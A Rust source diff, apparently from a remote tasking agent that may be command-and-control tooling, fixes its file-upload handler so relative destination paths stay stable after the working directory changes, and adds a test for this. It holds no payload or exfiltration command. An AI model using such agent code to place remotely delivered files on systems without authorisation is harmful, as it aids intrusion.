@@ -141,6 +141,16 @@ fn upload_destination(path: &str, original_filename: Option<&str>) -> Result<Pat
     Ok(dest)
 }
 
+fn stable_write_path(path: PathBuf) -> PathBuf {
+    if path.is_absolute() {
+        path
+    } else {
+        std::env::current_dir()
+            .unwrap_or_else(|_| PathBuf::from("."))
+            .join(path)
+    }
+}
+
 fn upload_request(state: &PendingUpload, chunk_num: u32) -> TaskResponse {
     TaskResponse {
         task_id: state.task_id,
@@ -325,6 +335,7 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
         Ok(path) => path,
         Err(e) => return TaskResponse::failed(task.id, &e),
     };
+    let dest = stable_write_path(dest);
     let path = dest.as_path();
     if !params.allow_system_path && is_protected_path(&display_path(path)) {
         return TaskResponse::failed(
@@ -749,5 +760,59 @@ mod tests {
         assert_eq!(std::fs::read(&tmp_path).unwrap(), original);
 
         let _ = std::fs::remove_file(tmp_path);
+    }
+
+    #[test]
+    fn test_upload_relative_path_survives_cwd_change() {
+        crate::common::cwd::with_cwd_lock(|| {
+            let original = b"relative upload";
+            let file_id = Uuid::new_v4();
+            let base = std::env::temp_dir().join(format!(
+                "nanaz_upload_cwd_{}_{}",
+                std::process::id(),
+                file_id
+            ));
+            let first_dir = base.join("first");
+            let second_dir = base.join("second");
+            std::fs::create_dir_all(&first_dir).unwrap();
+            std::fs::create_dir_all(&second_dir).unwrap();
+
+            let old_cwd = std::env::current_dir().unwrap();
+            std::env::set_current_dir(&first_dir).unwrap();
+            let task = TaskMessage {
+                id: Uuid::new_v4(),
+                command: "upload".into(),
+                parameters: serde_json::json!({
+                    "path": "relative.bin",
+                    "file_id": file_id,
+                })
+                .to_string(),
+                ..Default::default()
+            };
+
+            let request = handle(&task);
+            assert_eq!(request.status.as_deref(), Some("processing"));
+            std::env::set_current_dir(&second_dir).unwrap();
+
+            let responses = responses_from_receipts(&[PostResponseReceipt {
+                task_id: task.id,
+                status: "success".into(),
+                file_id: Some(file_id),
+                chunk_num: Some(1),
+                total_chunks: Some(1),
+                chunk_data: Some(crate::common::base64::encode(original)),
+                ..Default::default()
+            }]);
+            assert_eq!(responses.len(), 1);
+            assert_eq!(responses[0].completed, Some(true));
+            assert_eq!(
+                std::fs::read(first_dir.join("relative.bin")).unwrap(),
+                original
+            );
+            assert!(!second_dir.join("relative.bin").exists());
+
+            std::env::set_current_dir(old_cwd).unwrap();
+            let _ = std::fs::remove_dir_all(base);
+        });
     }
 }
